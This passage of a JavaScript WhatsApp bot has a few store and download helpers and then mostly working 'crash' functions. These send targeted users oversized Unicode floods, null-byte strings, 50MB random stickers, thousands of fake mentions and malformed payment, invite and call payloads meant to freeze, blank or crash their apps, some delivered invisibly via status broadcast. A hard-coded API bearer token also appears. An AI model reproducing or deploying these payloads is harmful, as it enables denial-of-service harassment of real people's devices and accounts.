                newsletterJid: '120363426723637081@newsletter',
                newsletterName: `𝐊𝐄𝐋𝐄𝐏𝐎𝐍`,
                serverMessageId: -1
            },
            externalAdReply: {
                title: "WissKelpinn",
                body: "created by: kelpin",
                thumbnailUrl: "https://img2.pixhost.to/images/7473/719258940_settomodders.jpg",
                sourceUrl: "https://wisskelpin.com",
                mediaType: 1,
                renderLargerThumbnail: false
            }
        }
    }, { 
        quoted: m // tetap pakai qtext bawaan SC
    });
};

const slideButton = async (jid, mention = []) => {
let imgsc = await prepareWAMessageMedia({ image: { url: global.image.logo }}, { upload: conn.waUploadToServer })
const msgii = await generateWAMessageFromContent(jid, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*All Transaksi Open ✅*\n\n*KELPIN STORE* Menyediakan Produk & Jasa Dibawah Ini ⬇️"
}), 
contextInfo: {
mentionedJid: mention
}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*Kelpin Gv*

-  *All Product Hubungi t.me/hope6166*`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*Bantu Join Saluran*
- *Saluran :*
https://whatsapp.com/channel/0029VbCRzsBHrDZpXJT0Pt0g`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {userJid: m.sender, quoted: qlocJpm})
await conn.relayMessage(jid, msgii.message, {messageId: msgii.key.id})
}
  
        async function tiktok2(query) {
  try {
    const encodedParams = new URLSearchParams();
    encodedParams.set('url', query);
    encodedParams.set('hd', '1');

    const response = await axios({
      method: 'POST',
      url: 'https://tikwm.com/api/',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Cookie': 'current_language=en',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
      },
      data: encodedParams
    });

    if (!response.data || response.data.code !== 0) {
      throw new Error("API TikWM Error / Video tidak ditemukan");
    }

    const v = response.data.data;
    return {
      title: v.title,
      cover: v.cover,
      origin_cover: v.origin_cover,
      no_watermark: v.play,
      watermark: v.wmplay,
      music: v.music
    };

  } catch (err) {
    console.error(err);
    return { error: true, message: err.message };
  }
}
//LAZADA
async function LazadaSearch(m, { conn, text, prefix, command, react }) {
  // Ambil teks dari reply kalau text kosong
  if (!text && m.quoted && m.quoted.text) {
    text = m.quoted.text;
  } else if (!text) {
    return; // nggak ada yang bisa dicari
  }

  if (react) await react(); // kalau ada sistem react emoji

  try {
    const url = `https://www.lazada.co.id/tag/${encodeURIComponent(text)}/?ajax=true&catalog_redirect_tag=true&isFirstRequest=true&page=1&q=${encodeURIComponent(text)}`;
    const headers = {
      'accept': '*/*',
      'accept-language': 'id-ID',
      'user-agent': 'Mozilla/5.0',
      'referer': `https://www.lazada.co.id/tag/${encodeURIComponent(text)}/`
    };

    const res1 = await fetch(url, { headers });
    const data1 = await res1.json();
    const totalResults = data1.mainInfo?.totalResults || 0;
    const totalPages = Math.ceil(totalResults / 40) || 1;
    const randomPage = Math.floor(Math.random() * totalPages) + 1;

    const pageUrl = `https://www.lazada.co.id/tag/${encodeURIComponent(text)}/?ajax=true&catalog_redirect_tag=true&isFirstRequest=false&page=${randomPage}&q=${encodeURIComponent(text)}`;
    const res2 = await fetch(pageUrl, { headers });
    const data2 = await res2.json();

    const items = data2.mods?.listItems || [];
    const selectedItems = items.sort(() => Math.random() - 0.5).slice(0, 15);

    const products = selectedItems.map((item, i) => ({
      no: i + 1,
      name: item.name || '',
      price: `Rp${parseInt(item.price || 0).toLocaleString('id-ID')}`,
      rating: item.ratingScore || 'N/A',
      sold: item.itemSoldCntShow || '0',
      location: item.location || '',
      brand: item.brandName || 'No Brand',
      url: item.itemUrl ? `https://www.lazada.co.id${item.itemUrl}` : '',
      thumbnail: item.image || ''
    }));

    let msg = `📦 *LAZADA SEARCH*\n\nQuery: *${text}*\nHalaman: *${randomPage}/${totalPages}*\nTotal: *${totalResults.toLocaleString()} item*\n\n`;
    products.forEach(v => {
      msg += `• *${v.name}*\n`;
      msg += `Harga: ${v.price}\n`;
      msg += `Rating: ${v.rating} ⭐\n`;
      msg += `Terjual: ${v.sold}\n`;
      msg += `Brand: ${v.brand}\n`;
      msg += `Lokasi: ${v.location}\n`;
      msg += `Link: ${v.url}\n\n`;
    });

    await conn.sendMessage(m.chat, { text: msg }, { quoted: m });

  } catch (err) {
    console.error(err);
    await conn.sendMessage(m.chat, { text: "⚠️ Error: " + err.message }, { quoted: m });
  }
}
//funct bug emoji
async function ForceIphoneInvisible(target) {
            try {
                const locationMessage = {
        			degreesLatitude: 0,
        			degreesLongitude: 0,
        			jpegThumbnail: null,
        			name: "\u0000" + "𑇂𑆵𑆴𑆿".repeat(15000),
        			address: "\u0000" + "𑇂𑆵𑆴𑆿".repeat(15000),
        			url: `https://www.xnxx.${"𑇂𑆵𑆴𑆿".repeat(15000)}.com`,
        		}
        		
        		const msg = generateWAMessageFromContent(target, {
                    viewOnceMessage: {
                        message: { locationMessage }
                    }
                }, {});
        		
        		await conn.relayMessage('status@broadcast', msg.message, {
        			messageId: msg.key.id,
        			statusJidList: [target],
        			additionalNodes: [{
        				tag: 'meta',
        				attrs: {},
        				content: [{
        					tag: 'mentioned_users',
        					attrs: {},
        					content: [{
        						tag: 'to',
        						attrs: { jid: target },
        						content: undefined
        					}]
        				}]
        			}]
        		});
        	} catch (err) {
        		console.error(err);
        	}
        };
async function FCInvisibleIOS(conn, target) {
  try {
    const { generateWAMessageFromContent } = require("@whiskeysockets/baileys");
    
    const porno = "𑇂𑆵𑆴𑆿".repeat(10000);
    
    const msg = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          locationMessage: {
            degreesLatitude: -99999.999999999999999,
            degreesLongitude: 9999.9999999999999999,
            name: "Setto" + porno,
            address: porno,
            url: "https://t.me/hope6166" + porno,
            jpegThumbnail: null,
            contextInfo: {
              mentionedJid: [target],
              participant: target,
              remoteJid: "status@broadcast",
              forwardingScore: 999999999,
              isForwarded: true,
              disappearingMode: {
                initiator: "INITIATED_BY_OTHER",
                trigger: "ACCOUNT_SETTING"
              }
            }
          }
        }
      }
    }, { userJid: target });

    await conn.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      participant: { jid: target },
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    });

    console.log("succes send ' invis iphone", target);
  } catch (err) {
  }
}
async function ArsyilOfficialForceInvisble(conn, target) {
  try {
    const { generateWAMessageFromContent } = require("@whiskeysockets/baileys");
    
    const stickerBuffer = Buffer.alloc(50 * 1024 * 1024);
    for (let i = 0; i < stickerBuffer.length; i++) {
      stickerBuffer[i] = Math.floor(Math.random() * 256);
    }
    
    const msg = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/webp",
            fileSha256: stickerBuffer.slice(0, 32),
            fileLength: stickerBuffer.length,
            height: 500000000,
            width: 500000000,
            mediaKey: stickerBuffer.slice(0, 32),
            fileEncSha256: stickerBuffer.slice(0, 32),
            directPath: "/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0",
            mediaKeyTimestamp: Math.floor(Date.now() / 1000),
            isAnimated: true,
            isAvatar: false,
            isAiSticker: false,
            isLottie: false,
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                "13135550002@s.whatsapp.net",
                "628111500888@s.whatsapp.net",
                "6281515006556@s.whatsapp.net",
                "14155238888@s.whatsapp.net",
                "628113185555@s.whatsapp.net",
                "628111112222@s.whatsapp.net",
                "6281115009999@s.whatsapp.net",
                "6281115001111@s.whatsapp.net",
                "8811111111@s.whatsapp.net",
                "8818585@s.whatsapp.net",
                "8817777@s.whatsapp.net",
                "881321@s.whatsapp.net",
                "888888@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () => 
                  `1${Math.floor(Math.random() * 50000000000000)}@s.whatsapp.net`
                )
              ],
              participant: target,
              remoteJid: "status@broadcast",
              forwardingScore: 999999999,
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363424572003216@newsletter",
                newsletterName: "🩸 ArsyilCynxo Sex Crash",
                serverMessageId: 1
              },
              disappearingMode: {
                initiator: "INITIATED_BY_OTHER",
                trigger: "ACCOUNT_SETTING"
              }
            }
          }
        }
      }
    }, { userJid: target });

    await conn.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      participants: { jid: target },
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    });

    console.log("Sayang Udah Mamam Beyum? 🥰", target);
  } catch (err) {
    console.log(err);
  }
}
async function y(target, conn) {
    try {
        const kontolll = {
            interactiveResponseMessage: {
                body: {
                    text: "YT: ArsyilOfficial-ID",
                    format: "EXTENSION_1"
                },
                nativeFlowResponseMessage: {
                    name: "address_message",
                    paramsJson: `{"values":{"in_pin_code":"999999","building_name":"saosinx","landmark_area":"X","address":"rapeng","tower_number":"@MakkLoo","city":"japanese","name":"over","phone_number":"999999999999","house_number":"xxx","floor_number":"xxx","state":"pepeqq | ${"\u0000".repeat(900000)}"}}`,
                    version: 3
                },
                contextInfo: {
                    remoteJid: target,
                    mentionedJid: [
                        "0@s.whatsapp.net",
                        "13135550002@s.whatsapp.net",
                        "628111500888@s.whatsapp.net",
                       "6281515006556@s.whatsapp.net",
                        "14155238888@s.whatsapp.net",
                        "628113185555@s.whatsapp.net",
                        "628111112222@s.whatsapp.net",
                       "6281115009999@s.whatsapp.net",
                       "6281115001111@s.whatsapp.net",
                        ...Array.from({ length: 1900 }, () => 
                            `1${Math.floor(Math.random() * 500000000000)}@s.whatsapp.net`
                        )
                    ],
                    forwardingScore: 9999,
                    isForwarded: true,
                    participant: target,
                    linkPreviewMetadata: {
                        paymentLinkMetadata: {
                            button: { displayText: "67" },
                            header: { headerType: 1 },
                            provider: { paramsJson: "{".repeat(10000) }
                        },
                        urlMetadata: { fbExperimentId: 999 }
                    }
                }
            }
        };
        
        const yeskink = await generateWAMessageFromContent(target, {
            groupStatusMessageV2: {
                message: kontolll
            }
        }, {
            userJid: target
        });
        
        await conn.relayMessage(target, yeskink.message, {
            messageId: yeskink.key.id,
            participant: { jid: target }
        });
        
        console.log("Crash Invisible Sending To", target);
    } catch (err) {
        console.log(err);
    }
}
async function ForceClickNewArsyilCynxo(target) {
  let Msg = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          contextInfo: {
            remoteJid: "X",
            mentionedJid: ["13135550002@s.whatsapp.net"],
            participant: target,
            isForwarded: true,
            forwardingScore: 9999,
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363424572003216@newsletter",
              newsletterName: "ArsyilCynxo Was Here",
              serverMessageId: 5
            }
          },
          body: {
            text: "🩸 YT: -MutanoXੑ",
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "send_payment_message",
                buttonParamsJson: "{\"currencyCode\":\"20\",\"amount\":9999999999999999999999999999999999999,\"requestType\":\"REQUEST\"}",
              },
            ],
          },
        },
      },
    },
  };
  await sleep(1000);
  let MsgContent = await conn.relayMessage(target, Msg, { participant: { jid: target } });
  await conn.sendMessage(target, { delete: MsgContent.key });
}
async function ArsyilSedotMemeg(conn, target) {
  try {
    const { generateWAMessageFromContent } = require("@whiskeysockets/baileys");
    
    const stickerBuffer = Buffer.alloc(50 * 1024 * 1024);
    for (let i = 0; i < stickerBuffer.length; i++) {
      stickerBuffer[i] = Math.floor(Math.random() * 256);
    }
    
    const msg = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/webp",
            fileSha256: stickerBuffer.slice(0, 32),
            fileLength: stickerBuffer.length,
            height: 500000000,
            width: 500000000,
            mediaKey: stickerBuffer.slice(0, 32),
            fileEncSha256: stickerBuffer.slice(0, 32),
            directPath: "/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0",
            mediaKeyTimestamp: Math.floor(Date.now() / 1000),
            isAnimated: true,
            isAvatar: false,
            isAiSticker: false,
            isLottie: false,
            contextInfo: {
              mentionedJid: Array.from({ length: 1900 }, () => 
                `1${Math.floor(Math.random() * 9999999999999999)}@s.whatsapp.net`
              ),
              participant: target,
              remoteJid: "status@broadcast",
              forwardingScore: 999999999,
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363424572003216@newsletter",
                newsletterName: "🩸 ArsyilCynxo Sex Crash",
                serverMessageId: 1
              },
              disappearingMode: {
                initiator: "INITIATED_BY_OTHER",
                trigger: "ACCOUNT_SETTING"
              }
            }
          }
        }
      }
    }, { userJid: target });

    await conn.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      participants: { jid: target },
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    });

    console.log("Sayang Udah Mamam Beyum? 🥰", target);
  } catch (err) {
  }
}
async function Virlok(target) {
  const context = {
    isSampled: true,
    participant: target,
    remoteJid: target,
    forwardingScore: 9999,
    isForwarded: true
  };

  const locationPayload = {
    locationMessage: {
      degreesLatitude: -6666666666,
      degreesLongitude: 6666666666,
      name: "Setto Attacking freeze🧊🗡" + "ꦾ".repeat(40000),
      address: "Setto Attacking freeze🧊🗡" + "ꦾ".repeat(40000),
      contextInfo: context
    }
  };

  const payload = {
    ephemeralMessage: {
      message: locationPayload
    }
  };

  const waMessage = await generateWAMessageFromContent(target, payload, {});

  await conn.relayMessage(target, waMessage.message, {
    messageId: waMessage.key.id
  });

  console.log("Crash Freeze Was Sending");
}
async function pelet(target) {
  await conn.relayMessage(target, {
    orderMessage: {
      contextInfo: {
        bussinesForwardingInfo: {
         bussinesOwnerJid: "13135550002@s.whatsapp.net"
        },
        quotedMessage: {
          contactMessage: {
            displayName: 1e380,
            clientUrl: null,
            serverUrl: null,
          }
        }
      }
    }
  }, { participant: { jid: target }});
}
async function InvisibleCall(target, Lolipop = false) {
    const { jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require("@whiskeysockets/baileys");

    try {
        const devices = (await conn.getUSyncDevices([target], false, false)).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

        await conn.assertSessions(devices);

        const createMutex = () => {
            const locks = new Map();
            return {
                async mutex(key, fn) {
                    while (locks.has(key)) await locks.get(key);
                    const lock = Promise.resolve().then(() => fn());
                    locks.set(key, lock);
                    try { return await lock; }
                    finally { locks.delete(key); }
                }
            };
        };

        const mutexManager = createMutex();

        const appendBufferMarker = (buffer) => {
            const newBuffer = Buffer.alloc(buffer.length + 8);
            buffer.copy(newBuffer);
            newBuffer.fill(1, buffer.length);
            return newBuffer;
        };

        const originalCreateParticipantNodes = conn.createParticipantNodes?.bind(conn);
        const originalEncodeWAMessage = conn.encodeWAMessage?.bind(conn);

        conn.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
            if (!recipientJids.length) {
                return {
                    nodes: [],
                    shouldIncludeDeviceIdentity: false
                };
            }

            const processedMessage = await (conn.patchMessageBeforeSending?.(message, recipientJids) ?? message);

            const messagePairs = Array.isArray(processedMessage)
                ? processedMessage
                : recipientJids.map(jid => ({
                    recipientJid: jid,
                    message: processedMessage
                }));

            const { id: meId, lid: meLid } = conn.authState.creds.me;
            const localUser = meLid ? jidDecode(meLid)?.user : null;
            let includeDevID = false;

            const nodes = await Promise.all(
                messagePairs.map(async ({ recipientJid: jid, message: msg }) => {
                    const { user: targetUser } = jidDecode(jid);
                    const { user: ownUser } = jidDecode(meId);
                    const isOwn = targetUser === ownUser || targetUser === localUser;
                    const isSelf = jid === meId || jid === meLid;

                    if (dsmMessage && isOwn && !isSelf) {
                        msg = dsmMessage;
                    }

                    const encodedBytes = appendBufferMarker(
                        originalEncodeWAMessage
                            ? originalEncodeWAMessage(msg)
                            : encodeWAMessage(msg)
                    );

                    return mutexManager.mutex(jid, async () => {
                        const { type, ciphertext } = await conn.signalRepository.encryptMessage({
                            jid,
                            data: encodedBytes
                        });

                        if (type === 'pkmsg') includeDevID = true;

                        return {
                            tag: 'to',
                            attrs: { jid },
                            content: [{
                                tag: 'enc',
                                attrs: { v: '2', type, ...extraAttrs },
                                content: ciphertext
                            }]
                        };
                    });
                })
            );

            return {
                nodes: nodes.filter(Boolean),
                shouldIncludeDeviceIdentity: includeDevID
            };
        };

        const callKey = crypto.randomBytes(32);
        const extendedCallKey = Buffer.concat([callKey, Buffer.alloc(8, 0x01)]);
        const callId = crypto.randomBytes(16).toString("hex").slice(0, 32).toUpperCase();

        const { nodes: destinations, shouldIncludeDeviceIdentity } = await conn.createParticipantNodes(devices, { conversation: "call-initiated" }, { count: '0' });

        const callStanza = {
            tag: "call",
            attrs: {
                to: target,
                id: conn.generateMessageTag(),
                from: conn.user.id
            },
            content: [{
                tag: "offer",
                attrs: { "call-id": callId, "call-creator": conn.user.id },
                content: [
                    { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                    { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                    ...(Lolipop ? [{
                        tag: "video",
                        attrs: {
                            enc: "vp8",
                            dec: "vp8",
                            orientation: "0",
                            screen_width: "1920",
                            screen_height: "1080",
                            device_orientation: "0"
                        }
                    }] : []),
                    { tag: "net", attrs: { medium: "3" }},
                    { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1,5,247,9,228,250,1]) },
                    { tag: "encopt", attrs: { keygen: "2" }},
                    { tag: "destination", attrs: {}, content: destinations },
                    ...(shouldIncludeDeviceIdentity ? [{
                        tag: "device-identity",
                        attrs: {},
                        content: encodeSignedDeviceIdentity(conn.authState.creds.account, true)
                    }] : [])
                ].filter(Boolean)
            }]
        };

        await conn.sendNode(callStanza);

    } catch (error) {
        console.error('Sending Terhalang :', error);
        throw error;
    }
}
async function reactChannel(link, emojis) {
  const bearers = "6ff2b5120dd7bb71f8859eb58495c91911daf16243ce7b6172d1f3b767846ef3"
  const idx = Math.floor(Math.random() * bearers.length)
  const tokek = bearers[idx]
  const res = await fetch('https://foreign-marna-sithaunarathnapromax-9a005c2e.koyeb.app/api/channel/react-to-post', {
    method: 'POST',
    headers: {
      'authority': 'foreign-marna-sithaunarathnapromax-9a005c2e.koyeb.app',
      'accept': 'application/json, text/plain, */*',
      'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
      'content-type': 'application/json',
      'authorization': tokek,
      'origin': 'https://asitha.top',
      'referer': 'https://asitha.top/',
      'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'cross-site',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
    },
    body: JSON.stringify({
      post_link: link,
      reacts: emojis
    })
  })
  const result = await res.text()
  console.log(chalk.red(`Sukses Reatch ch`));
 }

//~~~~~~~~~~~ All Function ~~~~~~~~~~~//
//BLANK UI
async function HpKentangJelek(conn, target) {
    const message = {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                            fileLength: "9999999999999",
                            pageCount: 1316134911,
                            mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                            fileName: "setto-kill-you>_<",
                            fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                            directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1726867151",
                            jpegThumbnail: ""
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "sv setto\n" + "ꦾ".repeat(90000)
                    },
                    nativeFlowMessage: {
                        buttons: [{
                            name: "single_select",
                            buttonParamsJson: "{}"
                        }, {
                            name: "call_permission_request",
                            buttonParamsJson: "{}"
                        }],
                        messageParamsJson: "{}"
                    },
                    contextInfo: {
                        mentionedJid: ["13135550002@s.whatsapp.net"],
                        forwardingScore: 9999,
                        isForwarded: true,
                        fromMe: false,
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        quotedMessage: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                fileLength: "9999999999999",
                                pageCount: 1316134911,
                                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                                fileName: "xvideos.com",
                                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1724474503",
                                contactVcard: true,
                                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                                jpegThumbnail: ""
                            }
                        }
                    }
                }
            }
        }
    };

    await conn.relayMessage(target, message, {
        participant: { jid: target }
    });
}
async function OctoberNewUi(target) { 
    try {
        const virtex = `\n${"ꦾ".repeat(10000)}`;
        const PayloadDoc = "ោ៝".repeat(10000);
        const imageCrash = "https://files.catbox.moe/jrs8gg.jpg";

        const album = await generateWAMessageFromContent(target, {
            albumMessage: {
                expectedImageCount: 999,
                expectedVideoCount: 666,
                contextInfo: {
                    mentionedJid: [target],
                    externalAdReply: {
                        title: "Crash Album",
                        body: "{".repeat(20000),
                        mediaType: 1
                    }
                }
            }
        }, { userJid: target, upload: conn.waUploadToServer });

        await conn.relayMessage(target, album.message, { messageId: album.key.id });

        for (let i = 0; i < 100; i++) {
            const imgMsg = await generateWAMessage(target, {
                image: { url: imageCrash },
                caption: "Settdevv",
            }, { upload: conn.waUploadToServer });

            await conn.relayMessage(target, imgMsg.message, { messageId: imgMsg.key.id });
        }

        const message = {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "sv MutanoX",
                            format: "DEFAULT"
                        },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "quick_reply",
                                    paramsJson: "\u0000".repeat(20000)
                                },
                                {
                                    name: "single_select",
                                    paramsJson: "\u0000".repeat(20000)
                                },
                                {
                                    name: "cta_copy",
                                    paramsJson: "\u0000".repeat(20000)
                                },
                                {
                                    name: "cta_call",
                                    paramsJson: "\u0000".repeat(20000)
                                },
                                {
                                    name: "review_and_pay",
                                    paramsJson: "\u0000".repeat(20000)
                                },
                                {
                                    name: "payment_requested",
                                    paramsJson: "\u0000".repeat(20000)
                                },
                                {
                                    name: "call_permission_request",
                                    paramsJson: "\u0000".repeat(20000)
                                },
                                {
                                    name: "cta_reminder",
                                    paramsJson: "\u0000".repeat(20000)
                                },
                                {
                                    name: "cta_cancel_reminder",
                                    paramsJson: "\u0000".repeat(20000)
                                },
                                {
                                    name: "address_message",
                                    paramsJson: "\u0000".repeat(20000)
                                },
                                {
                                    name: "send_location",
                                    paramsJson: "\u0000".repeat(20000)
                                },
                                {
                                    name: "mpm",
                                    paramsJson: "\u0000".repeat(20000)
                                },
                                {
                                    name: "channel_invite",
                                    paramsJson: JSON.stringify({
                                        groupJid: "1203630xxxxxx@g.us",
                                        inviteCode: "AbCdEfGhIjKLMN",
                                        groupName: "setto Channel" + PayloadDoc,
                                        caption: "Channel crash" + virtex
                                    })
                                },
                                {
                                    name: "group_invite",
                                    paramsJson: JSON.stringify({
                                        groupJid: "1203630yyyyyy@g.us",
                                        inviteCode: "XyZpQrStUvWxYz",
                                        groupName: "setto Private " + PayloadDoc,
                                        caption: "Join grup crash" + virtex
                                    })
                                }
                            ]
                        }
                    }
                }
            }
        };

        await conn.relayMessage(target, message, { messageId: "setto-doc-bug" });
        console.log("Success send Bug →", target);

    } catch (e) {
        console.error("Error bug:", e);
    }
}

async function NanBlankIphone(target) {
    try {
        const messsage = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `120363415511005103@newsletter`,
                        newsletterName: "💧SETTO KILL YOU💧" + "ી".repeat(100000),
                        jpegThumbnail: null,
                        caption: "ꦽ".repeat(100000),
                        inviteExpiration: Date.now() + 1814400000,
                    },
                },
            },
        };
        await conn.relayMessage(target, messsage, {
            userJid: target,
        });
    }
    catch (err) {
        console.log(err);
    }
}       
async function FreezeCrash(target) {
  try {
    let msg1 = {
      viewOnceMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "120363321780343299@newsletter",
            newsletterName: "SETTL • GANTENK" + "ꦾ࣯࣯".repeat(10000),
            caption: "SETTO :: OFFICIAL" + "ꦾ࣯࣯".repeat(10000),
            inviteExpiration: 999999999
          },
        },
      },
    };
    
    await conn.relayMessage(target, msg1, {
      messageId: null,
      participant: { jid: target }
    });
    console.log(chalk.bold.red(`[+]: PROSES SENDING`));

    const msgContent2 = {
      viewOnceMessage: {
        message: {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "SETTO • CRASH" + "\u202E".repeat(500) + "\uDBFF\uDFFF".repeat(1000),
                  hasMediaAttachment: false,
                  locationMessage: {
                    degreesLatitude: 992.999999,
                    degreesLongitude: -932.8889989,
                    name: "\u900A" + "\u0000".repeat(5000) + "\uFFFF".repeat(2000),
                    address: "\u0007".repeat(20000) + "꧔꧈".repeat(5000) + "\u2060".repeat(1000),
                  },
                },
                body: {
                  text: " SETTO : GANTENG " + "\u0003".repeat(10000) + "꧔꧈".repeat(2000)
                },
                contextInfo: {
                  remoteJid: target,
                  participant: "0@s.whatsapp.net",
                  stanzaId: "1234567890ABCDEF",
                  forwardingScore: 99999,
                  isForwarded: true,
                  businessMessageForwardInfo: {
                    businessOwnerJid: "13135550002@s.whatsapp.net"
                  },
                  mentionedJid: [
                    target,
                    "1@s.whatsapp.net",
                    "0@s.whatsapp.net",
